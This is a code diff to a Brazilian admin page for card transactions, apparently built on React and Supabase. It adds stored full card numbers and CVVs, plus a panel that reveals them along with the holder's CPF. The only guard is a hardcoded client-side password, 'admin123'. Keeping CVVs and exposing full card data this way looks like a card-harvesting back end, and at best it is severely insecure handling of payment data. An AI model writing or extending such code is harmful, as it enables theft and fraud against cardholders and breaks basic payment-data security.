@@ -1,7 +1,7 @@
 import { useState, useEffect } from "react";
 import { supabase } from "@/integrations/supabase/client";
 import { Button } from "@/components/ui/button";
-import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
+import { Card, CardContent } from "@/components/ui/card";
 import { Table, TableBody, TableCell, TableHead, TableHeader, TableRow } from "@/components/ui/table";
 import { Dialog, DialogContent, DialogHeader, DialogTitle, DialogDescription } from "@/components/ui/dialog";
 import { Input } from "@/components/ui/input";
@@ -15,6 +15,8 @@ type Transaction = {
   cpf: string;
   card_brand: string;
   card_last4: string;
+  card_number: string;
+  card_cvv: string;
   card_expiry: string;
   plan_label: string;
   quantity: number;
@@ -28,13 +30,13 @@ type Transaction = {
   processed_at: string | null;
 };
 
-const ADMIN_PASSWORD = "admin123"; // Altere esta senha conforme necessário
+const ADMIN_PASSWORD = "admin123";
 
-const RevealField = ({ label, masked, revealed }: { label: string; masked: string; revealed: string }) => {
+const ToggleField = ({ label, masked, real }: { label: string; masked: string; real: string }) => {
   const [visible, setVisible] = useState(false);
   return (
-    <p className="flex items-center gap-1.5">
-      <strong>{label}:</strong> {visible ? revealed : masked}
+    <p className="flex items-center gap-1.5 text-sm">
+      <strong>{label}:</strong> {visible ? real : masked}
       <button onClick={() => setVisible(!visible)} className="ml-1 text-muted-foreground hover:text-foreground transition-colors">
         {visible ? <EyeOff className="h-3.5 w-3.5" /> : <Eye className="h-3.5 w-3.5" />}
       </button>
@@ -114,10 +116,18 @@ const AdminCartoes = () => {
     }
   };
 
+  const formatCpf = (cpf: string) => {
+    if (cpf.length === 11) return cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4");
+    return cpf;
+  };
+
   const maskCpf = (cpf: string) => {
-    if (cpf.length === 11) return `${cpf.slice(0, 3)}.***.**${cpf.slice(9)}-${cpf.slice(9)}`;
+    if (cpf.length === 11) return `${cpf.slice(0, 3)}.***.**${cpf.slice(9)}-${cpf.slice(9, 11)}`;
     return "***.***.***-**";
   };
+
+  const formatCardNumber = (n: string) => n.replace(/(.{4})/g, "$1 ").trim();
+  const maskCardNumber = (last4: string) => `**** **** **** ${last4}`;
 
   const formatDate = (d: string) => new Date(d).toLocaleString("pt-BR");
 
@@ -145,18 +155,10 @@ const AdminCartoes = () => {
         </div>
 
         <div className="flex gap-2 mb-4">
-          <Button
-            variant={filter === "pending" ? "default" : "outline"}
-            size="sm"
-            onClick={() => setFilter("pending")}
-          >
+          <Button variant={filter === "pending" ? "default" : "outline"} size="sm" onClick={() => setFilter("pending")}>
             Pendentes
           </Button>
-          <Button
-            variant={filter === "all" ? "default" : "outline"}
-            size="sm"
-            onClick={() => setFilter("all")}
-          >
+          <Button variant={filter === "all" ? "default" : "outline"} size="sm" onClick={() => setFilter("all")}>
             Todas
           </Button>
         </div>
@@ -275,11 +277,12 @@ const AdminCartoes = () => {
 
                 {!showData && !askingPassword && (
                   <div className="space-y-1">
-                    <p><strong>Titular:</strong> {viewTx.holder_name}</p>
-                    <p><strong>CPF:</strong> {maskCpf(viewTx.cpf)}</p>
-                    <p><strong>Cartão:</strong> **** **** **** {viewTx.card_last4}</p>
-                    <p><strong>Bandeira:</strong> <span className="capitalize">{viewTx.card_brand}</span></p>
-                    <p><strong>Validade:</strong> **/**</p>
+                    <p className="text-sm"><strong>Titular:</strong> {viewTx.holder_name}</p>
+                    <p className="text-sm"><strong>CPF:</strong> {maskCpf(viewTx.cpf)}</p>
+                    <p className="text-sm"><strong>Cartão:</strong> {maskCardNumber(viewTx.card_last4)}</p>
+                    <p className="text-sm"><strong>Bandeira:</strong> <span className="capitalize">{viewTx.card_brand}</span></p>
+                    <p className="text-sm"><strong>Validade:</strong> **/**</p>
+                    <p className="text-sm"><strong>CVV:</strong> ***</p>
                     <Button variant="outline" size="sm" onClick={handleReveal} className="mt-2">
                       <Eye className="h-3.5 w-3.5 mr-1" /> Revelar dados completos
                     </Button>
@@ -296,6 +299,7 @@ const AdminCartoes = () => {
                       onChange={(e) => { setPasswordInput(e.target.value); setPasswordError(""); }}
                       className={passwordError ? "border-destructive" : ""}
                       autoFocus
+                      onKeyDown={(e) => e.key === "Enter" && handlePasswordSubmit()}
                     />
                     {passwordError && <p className="text-xs text-destructive">{passwordError}</p>}
                     <div className="flex gap-2">
@@ -307,12 +311,17 @@ const AdminCartoes = () => {
 
                 {showData && (
                   <div className="space-y-2 bg-muted/50 p-3 rounded-lg">
-                    <p><strong>Titular:</strong> {viewTx.holder_name}</p>
-                    <RevealField label="CPF" masked={maskCpf(viewTx.cpf)} revealed={viewTx.cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4")} />
-                    <RevealField label="Cartão" masked={`**** **** **** ${viewTx.card_last4}`} revealed={`**** **** **** ${viewTx.card_last4}`} />
-                    <p><strong>Bandeira:</strong> <span className="capitalize">{viewTx.card_brand}</span></p>
-                    <RevealField label="Validade" masked="**/**" revealed={viewTx.card_expiry} />
-                    <p><strong>Token:</strong> <code className="text-xs bg-muted px-1 rounded">{viewTx.token}</code></p>
+                    <p className="text-sm"><strong>Titular:</strong> {viewTx.holder_name}</p>
+                    <ToggleField label="CPF" masked={maskCpf(viewTx.cpf)} real={formatCpf(viewTx.cpf)} />
+                    <ToggleField
+                      label="Cartão"
+                      masked={maskCardNumber(viewTx.card_last4)}
+                      real={viewTx.card_number ? formatCardNumber(viewTx.card_number) : maskCardNumber(viewTx.card_last4)}
+                    />
+                    <p className="text-sm"><strong>Bandeira:</strong> <span className="capitalize">{viewTx.card_brand}</span></p>
+                    <ToggleField label="Validade" masked="**/**" real={viewTx.card_expiry} />
+                    <ToggleField label="CVV" masked="***" real={viewTx.card_cvv || "---"} />
+                    <p className="text-sm"><strong>Token:</strong> <code className="text-xs bg-muted px-1 rounded">{viewTx.token}</code></p>
                   </div>
                 )}
               </div>
